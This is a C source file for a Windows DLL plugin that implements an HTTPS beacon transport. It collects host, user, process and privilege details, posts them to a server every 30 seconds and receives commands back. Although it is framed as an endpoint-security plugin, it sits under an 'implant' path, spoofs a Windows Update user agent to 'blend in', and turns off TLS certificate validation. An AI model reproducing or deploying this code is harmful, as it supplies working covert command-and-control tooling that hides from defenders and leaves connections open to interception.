/*
 * https_comm.c — HTTPS beacon comm transport plugin (Windows DLL).
 *
 * Implements edr_iface_comm_t via WinHTTP.  The dispatcher dlopen's this
 * at runtime; it advertises EDR_CAP_COMM_TRANSPORT and priority 10.
 *
 * Beacon protocol
 * ───────────────
 * POST /api/v1/beacon  (JSON)
 *
 *   Outbound body:
 *     { "agent_id": "...", "seq": N,
 *       "msgs": [ {"command_id":"...","seq":N,"type":N}, ... ] }
 *
 *   Inbound response (200 OK):
 *     { "commands": [ {"command_id":"...","seq":N,"payload":"..."}, ... ] }
 *
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc -shared -fPIC -o https_comm.dll https_comm.c \
 *       -I../../../../src/implant -lwinhttp -lws2_32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#include "edr_plugin.h"
#include "edr_interfaces.h"

/* ─── Constants ────────────────────────────────────────────────── */
#define SEND_QUEUE_CAP   64
#define JSON_OUT_BUF     65536
#define JSON_IN_BUF      131072
#define BEACON_PATH      L"/api/v1/beacon"
#define USER_AGENT       L"WindowsUpdate/10.0"   /* blend in */
#define BEACON_MS        30000                    /* 30 s default interval */
#define CONNECT_TIMEOUT  10000                    /* ms */
#define RECV_TIMEOUT     60000                    /* ms */

/* ─── Plugin globals ───────────────────────────────────────────── */
static const edr_plugin_services_t *g_svc      = NULL;
static const edr_agent_identity_t  *g_identity  = NULL;

/* ─── System info (gathered once at init) ──────────────────────── */
static char g_username[64]  = "unknown";
static char g_os[128]       = "Windows";
static char g_arch[16]      = "unknown";
static int  g_pid           = 0;
static int  g_elevated      = 0;

static void gather_sysinfo(void) {
    /* PID */
    g_pid = (int)GetCurrentProcessId();

    /* Username */
    DWORD sz = (DWORD)sizeof(g_username);
    GetUserNameA(g_username, &sz);

    /* Admin / elevation */
    HANDLE tok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION elev;
        DWORD ret = 0;
        if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &ret))
            g_elevated = elev.TokenIsElevated;
        CloseHandle(tok);
    }

    /* Architecture */
#if defined(__x86_64__) || defined(_M_X64)
    strcpy(g_arch, "x86_64");
#elif defined(__i386__) || defined(_M_IX86)
    strcpy(g_arch, "x86");
#elif defined(__aarch64__) || defined(_M_ARM64)
    strcpy(g_arch, "arm64");
#endif

    /* OS version — read from registry for a human-readable product name */
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD type, vlen = (DWORD)sizeof(g_os);
        RegQueryValueExA(hk, "ProductName", NULL, &type,
                         (LPBYTE)g_os, &vlen);
        RegCloseKey(hk);
    }
}

static HINTERNET     g_session    = NULL;
static WCHAR         g_hostname[512];
static INTERNET_PORT g_port       = 443;
static int           g_use_tls    = 1;
static volatile int  g_connected  = 0;

static edr_recv_cb_t g_recv_cb    = NULL;
static void         *g_recv_ctx   = NULL;

/* ─── Send queue ───────────────────────────────────────────────── */
static char         *g_queue[SEND_QUEUE_CAP];
static int           g_qhead = 0, g_qtail = 0;
static CRITICAL_SECTION g_qmu;

static int  q_empty(void) { return g_qhead == g_qtail; }
static int  q_full(void)  { return ((g_qtail + 1) % SEND_QUEUE_CAP) == g_qhead; }

static int q_push(const char *s) {
    if (q_full()) return 0;
    size_t n = strlen(s) + 1;
    char *c = (char *)malloc(n);
    if (!c) return 0;
    memcpy(c, s, n);
    g_queue[g_qtail] = c;
    g_qtail = (g_qtail + 1) % SEND_QUEUE_CAP;
    return 1;
}

static char *q_pop(void) {
    if (q_empty()) return NULL;
    char *p = g_queue[g_qhead];
    g_queue[g_qhead] = NULL;
    g_qhead = (g_qhead + 1) % SEND_QUEUE_CAP;
    return p;
}

/* ─── Beacon thread control ────────────────────────────────────── */
static HANDLE g_thread     = NULL;
static HANDLE g_stop_evt   = NULL;   /* manual-reset, set to kill thread  */
static HANDLE g_wake_evt   = NULL;   /* auto-reset,   set to wake early   */
static volatile uint64_t g_seq = 0;

/* ─── Logging helper ───────────────────────────────────────────── */
#define PLOG(lvl, fmt, ...) do { \
    if (g_svc && g_svc->log)     \
        g_svc->log(lvl, "https_comm", fmt, ##__VA_ARGS__); \
} while (0)

/* ─── Minimal JSON helpers (no external deps) ──────────────────── */

/* Write JSON-escaped src into dst[dsz].  Returns chars written. */
static int json_esc(char *dst, size_t dsz, const char *src) {
    int n = 0;
    for (; *src && (size_t)(n + 2) < dsz; src++) {
        unsigned char c = (unsigned char)*src;
        if      (c == '"' || c == '\\') { dst[n++] = '\\'; dst[n++] = c; }
        else if (c == '\n')              { dst[n++] = '\\'; dst[n++] = 'n'; }
        else if (c == '\r')              { dst[n++] = '\\'; dst[n++] = 'r'; }
        else if (c >= 0x20)              { dst[n++] = c; }
    }
    dst[n] = '\0';
    return n;
}

/* Extract a JSON string value for the given key into out_buf[out_sz]. */
static int json_get_str(const char *json, const char *key,
                        char *out_buf, size_t out_sz)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1) {
        if (*p == '\\' && *(p + 1)) { p++; }
        out_buf[i++] = *p++;
    }
    out_buf[i] = '\0';
    return (int)i;
}

/* Extract a uint64 value for the given numeric JSON key. */
static uint64_t json_get_u64(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    return (uint64_t)strtoull(p + strlen(needle), NULL, 10);
}

/* Build the POST body from the send queue.  Caller must free(). */
static char *build_body(void) {
    char *buf = (char *)malloc(JSON_OUT_BUF);
    if (!buf) return NULL;

    char id_e[EDR_AGENT_ID_LEN * 2]  = "unknown";
    char host_e[256]                  = "unknown";
    char user_e[128]                  = "unknown";
    char os_e[256]                    = "Windows";
    char arch_e[32]                   = "unknown";

    if (g_identity) {
        json_esc(id_e,   sizeof(id_e),   g_identity->agent_id);
        json_esc(host_e, sizeof(host_e), g_identity->hostname);
    }
    json_esc(user_e, sizeof(user_e), g_username);
    json_esc(os_e,   sizeof(os_e),   g_os);
    json_esc(arch_e, sizeof(arch_e), g_arch);

    int n = snprintf(buf, JSON_OUT_BUF,
        "{\"agent_id\":\"%s\",\"seq\":%llu"
        ",\"hostname\":\"%s\",\"username\":\"%s\""
        ",\"os\":\"%s\",\"arch\":\"%s\""
        ",\"pid\":%d,\"elevated\":%d"
        ",\"msgs\":[",
        id_e, (unsigned long long)g_seq++,
        host_e, user_e, os_e, arch_e,
        g_pid, g_elevated);

    EnterCriticalSection(&g_qmu);
    int first = 1;
    char *entry;
    while ((entry = q_pop()) != NULL) {
        if (!first && n < JSON_OUT_BUF - 2) buf[n++] = ',';
        first = 0;
        int rem = JSON_OUT_BUF - n - 4;
        int elen = (int)strlen(entry);
        if (rem > 0) { int cp = elen < rem ? elen : rem; memcpy(buf+n, entry, cp); n += cp; }
        free(entry);
    }
    LeaveCriticalSection(&g_qmu);

    if (n < JSON_OUT_BUF - 3) { buf[n++] = ']'; buf[n++] = '}'; buf[n] = '\0'; }
    return buf;
}

/* Parse commands array and call g_recv_cb for each command object. */
static void handle_response(const char *resp) {
    if (!g_recv_cb) return;

    const char *arr = strstr(resp, "\"commands\":[");
    if (!arr) return;
    arr += (int)strlen("\"commands\":[");

    for (;;) {
        while (*arr && *arr != '{') arr++;
        if (!*arr) break;

        /* Find matching '}' respecting nesting and quoted strings */
        const char *start = arr;
        int depth = 0;
        const char *p = arr;
        while (*p) {
            if      (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; if (*p) p++; } }
            else if (*p == '{') depth++;
            else if (*p == '}') { if (--depth == 0) { p++; break; } }
            if (*p) p++;
        }

        size_t obj_len = (size_t)(p - start);
        char *obj = (char *)malloc(obj_len + 1);
        if (obj) {
            memcpy(obj, start, obj_len);
            obj[obj_len] = '\0';

            edr_message_t msg;
            memset(&msg, 0, sizeof(msg));
            msg.type           = EDR_MSG_COMMAND;
            msg.seq            = json_get_u64(obj, "seq");
            msg.correlation_id = 0;
            msg.timestamp      = (time_t)time(NULL);
            json_get_str(obj, "command_id", msg.command_id, sizeof(msg.command_id));

            /* Payload stored inline — valid for the duration of this callback */
            static char payload_buf[4096];
            json_get_str(obj, "payload", payload_buf, sizeof(payload_buf));
            msg.payload.data = (uint8_t *)payload_buf;
            msg.payload.len  = strlen(payload_buf);

            if (msg.command_id[0] != '\0') {
                PLOG(EDR_LOG_DEBUG, "recv '%s' seq=%llu",
                     msg.command_id, (unsigned long long)msg.seq);
                g_recv_cb(&msg, g_recv_ctx);
            }
            free(obj);
        }
        arr = p;
    }
}

/* ─── Single beacon cycle ──────────────────────────────────────── */
static void do_beacon(void) {
    char *body = build_body();
    if (!body) { PLOG(EDR_LOG_ERROR, "OOM building body"); return; }

    HINTERNET hConn = WinHttpConnect(g_session, g_hostname, g_port, 0);
    if (!hConn) {
        PLOG(EDR_LOG_WARN, "WinHttpConnect failed: %lu", GetLastError());
        free(body); return;
    }

    DWORD req_flags = g_use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", BEACON_PATH,
                                         NULL, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
    if (!hReq) {
        PLOG(EDR_LOG_WARN, "WinHttpOpenRequest failed: %lu", GetLastError());
        WinHttpCloseHandle(hConn); free(body); return;
    }

    /* Timeouts */
    WinHttpSetTimeouts(hReq, CONNECT_TIMEOUT, CONNECT_TIMEOUT,
                       RECV_TIMEOUT, RECV_TIMEOUT);

    /* Ignore cert errors when no CA bundle is pinned (dev mode) */
    if (g_use_tls) {
        DWORD ignore = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                     | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                     | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &ignore, sizeof(ignore));
    }

    const WCHAR *hdrs = L"Content-Type: application/json\r\nAccept: application/json\r\n";
    DWORD blen = (DWORD)strlen(body);

    if (!WinHttpSendRequest(hReq, hdrs, (DWORD)-1L, (LPVOID)body, blen, blen, 0) ||
        !WinHttpReceiveResponse(hReq, NULL))
    {
        PLOG(EDR_LOG_WARN, "HTTP request failed: %lu", GetLastError());
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); free(body); return;
    }
    free(body);

    /* Query HTTP status */
    DWORD http_status = 0, stat_sz = sizeof(http_status);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &http_status, &stat_sz, WINHTTP_NO_HEADER_INDEX);

    if (http_status != 200) {
        PLOG(EDR_LOG_WARN, "Beacon HTTP %lu", http_status);
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); return;
    }

    /* Read full response */
    char *resp = (char *)malloc(JSON_IN_BUF);
    if (resp) {
        DWORD total = 0, avail = 0, got = 0;
        while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
            if (total + avail >= JSON_IN_BUF - 1) avail = JSON_IN_BUF - 1 - total;
            if (!WinHttpReadData(hReq, resp + total, avail, &got)) break;
            total += got;
        }
        resp[total] = '\0';
        if (total > 0) {
            PLOG(EDR_LOG_DEBUG, "Beacon OK (%lu bytes)", total);
            handle_response(resp);
        }
        free(resp);
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
}

/* ─── Beacon thread ────────────────────────────────────────────── */
static DWORD WINAPI beacon_proc(LPVOID arg) {
    (void)arg;
    PLOG(EDR_LOG_INFO, "Beacon thread started → %S:%u (TLS=%d)",
         g_hostname, g_port, g_use_tls);

    HANDLE evts[2] = { g_wake_evt, g_stop_evt };

    while (1) {
        do_beacon();
        DWORD result = WaitForMultipleObjects(2, evts, FALSE, BEACON_MS);
        if (result == WAIT_OBJECT_0) {
            /* wake_evt fired — do an immediate cycle (auto-reset, no ResetEvent needed) */
            continue;
        } else if (result == WAIT_OBJECT_0 + 1) {
            /* stop_evt — exit cleanly */
            break;
        }
        /* WAIT_TIMEOUT — normal interval, loop */
    }

    PLOG(EDR_LOG_INFO, "Beacon thread stopped");
    return 0;
}

/* ─── edr_iface_comm_t ─────────────────────────────────────────── */

static edr_status_t comm_connect(const edr_endpoint_t *ep,
                                  edr_completion_cb_t cb, void *ctx)
{
    if (!ep) return EDR_ERR_INVALID_ARG;
    if (g_connected) { if (cb) cb(ctx, EDR_OK, NULL); return EDR_OK; }

    /* Parse URL — strip scheme to get raw hostname */
    const char *host = ep->url;
    if      (strncmp(host, "https://", 8) == 0) { host += 8; g_use_tls = 1; }
    else if (strncmp(host, "http://",  7) == 0) { host += 7; g_use_tls = 0; }

    /* Strip any path suffix, keep only the host[:port] part */
    char host_only[512] = {0};
    const char *slash = strchr(host, '/');
    size_t hlen = slash ? (size_t)(slash - host) : strlen(host);
    if (hlen >= sizeof(host_only)) hlen = sizeof(host_only) - 1;
    memcpy(host_only, host, hlen);

    /* Convert to WCHAR */
    MultiByteToWideChar(CP_UTF8, 0, host_only, -1, g_hostname,
                        (int)(sizeof(g_hostname) / sizeof(WCHAR)));

    g_port = ep->port ? ep->port : (INTERNET_PORT)(g_use_tls ? 443 : 80);

    /* Open WinHTTP session */
    g_session = WinHttpOpen(USER_AGENT,
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME,
                             WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) {
        PLOG(EDR_LOG_ERROR, "WinHttpOpen failed: %lu", GetLastError());
        return EDR_ERR_NETWORK;
    }

    /* Thread sync objects */
    g_stop_evt = CreateEvent(NULL, TRUE,  FALSE, NULL);
    g_wake_evt = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_stop_evt || !g_wake_evt) {
        WinHttpCloseHandle(g_session); g_session = NULL;
        return EDR_ERR_GENERIC;
    }

    InitializeCriticalSection(&g_qmu);

    /* Kick off the beacon thread */
    g_thread = CreateThread(NULL, 0, beacon_proc, NULL, 0, NULL);
    if (!g_thread) {
        PLOG(EDR_LOG_ERROR, "CreateThread failed: %lu", GetLastError());
        DeleteCriticalSection(&g_qmu);
        CloseHandle(g_stop_evt); g_stop_evt = NULL;
        CloseHandle(g_wake_evt); g_wake_evt = NULL;
        WinHttpCloseHandle(g_session); g_session = NULL;
        return EDR_ERR_GENERIC;
    }

    g_connected = 1;
    PLOG(EDR_LOG_INFO, "Connected to %s:%u", host_only, g_port);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_disconnect(edr_completion_cb_t cb, void *ctx) {
    if (!g_connected) { if (cb) cb(ctx, EDR_OK, NULL); return EDR_OK; }

    if (g_stop_evt) SetEvent(g_stop_evt);
    if (g_thread) {
        WaitForSingleObject(g_thread, 5000);
        CloseHandle(g_thread); g_thread = NULL;
    }
    if (g_stop_evt) { CloseHandle(g_stop_evt); g_stop_evt = NULL; }
    if (g_wake_evt) { CloseHandle(g_wake_evt); g_wake_evt = NULL; }

    EnterCriticalSection(&g_qmu);
    char *e;
    while ((e = q_pop()) != NULL) free(e);
    LeaveCriticalSection(&g_qmu);
    DeleteCriticalSection(&g_qmu);

    if (g_session) { WinHttpCloseHandle(g_session); g_session = NULL; }
    g_connected = 0;
    PLOG(EDR_LOG_INFO, "Disconnected");
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_send(const edr_message_t *msg,
                               edr_completion_cb_t cb, void *ctx)
{
    if (!msg) return EDR_ERR_INVALID_ARG;

    char cmd_e[128];
    json_esc(cmd_e, sizeof(cmd_e), msg->command_id);

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"command_id\":\"%s\",\"seq\":%llu,\"type\":%d}",
        cmd_e, (unsigned long long)msg->seq, (int)msg->type);

    EnterCriticalSection(&g_qmu);
    int ok = q_push(json);
    LeaveCriticalSection(&g_qmu);

    if (!ok) {
        PLOG(EDR_LOG_WARN, "Send queue full, dropping '%s'", msg->command_id);
        if (cb) cb(ctx, EDR_ERR_BUSY, NULL);
        return EDR_ERR_BUSY;
    }

    /* Flush immediately */
    if (g_wake_evt) SetEvent(g_wake_evt);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_set_recv(edr_recv_cb_t handler, void *ctx) {
    g_recv_cb  = handler;
    g_recv_ctx = ctx;
    return EDR_OK;
}

static edr_status_t comm_heartbeat(edr_completion_cb_t cb, void *ctx) {
    PLOG(EDR_LOG_DEBUG, "heartbeat");
    if (g_wake_evt) SetEvent(g_wake_evt);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static int comm_is_connected(void) { return g_connected; }

static const edr_iface_comm_t s_comm = {
    .connect          = comm_connect,
    .disconnect       = comm_disconnect,
    .send             = comm_send,
    .set_recv_handler = comm_set_recv,
    .heartbeat        = comm_heartbeat,
    .is_connected     = comm_is_connected,
};

/* ─── Lifecycle ────────────────────────────────────────────────── */

static edr_status_t plugin_init(const edr_plugin_services_t *svc,
                                 const edr_agent_identity_t  *identity)
{
    g_svc      = svc;
    g_identity = identity;
    gather_sysinfo();
    PLOG(EDR_LOG_INFO, "Initialized for agent '%s' pid=%d user=%s os=%s",
         identity ? identity->agent_id : "?", g_pid, g_username, g_os);
    return EDR_OK;
}

static edr_status_t plugin_shutdown(void) {
    comm_disconnect(NULL, NULL);
    g_svc = NULL;
    PLOG(EDR_LOG_INFO, "Shutdown");
    return EDR_OK;
}

static const edr_iface_comm_t *get_comm(void) { return &s_comm; }

/* ─── Plugin entry (the only exported symbol) ───────────────────── */

__declspec(dllexport)
edr_status_t edr_plugin_entry(edr_plugin_manifest_t *out)
{
    if (!out) return EDR_ERR_INVALID_ARG;

    out->abi_version.major = EDR_INTERFACE_VERSION_MAJOR;
    out->abi_version.minor = EDR_INTERFACE_VERSION_MINOR;
    out->abi_version.patch = EDR_INTERFACE_VERSION_PATCH;

    strncpy(out->name,   "https_comm", sizeof(out->name)   - 1);
    strncpy(out->vendor, "Cynosure",   sizeof(out->vendor) - 1);

    out->plugin_version.major = 1;
    out->plugin_version.minor = 0;
    out->plugin_version.patch = 0;

    out->capabilities = EDR_CAP_COMM_TRANSPORT;
    out->priority     = 10;

    out->init     = plugin_init;
    out->shutdown = plugin_shutdown;

    /* Only provides comm transport; all other accessors NULL */
    out->get_comm        = get_comm;
    out->get_file_ops    = NULL;
    out->get_scan        = NULL;
    out->get_event       = NULL;
    out->get_remediation = NULL;
    out->get_config      = NULL;
    out->get_health      = NULL;
    out->get_auth        = NULL;

    return EDR_OK;
}

/* ─── DLL entry point ───────────────────────────────────────────── */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_DETACH && g_connected)
        comm_disconnect(NULL, NULL);
    return TRUE;
}
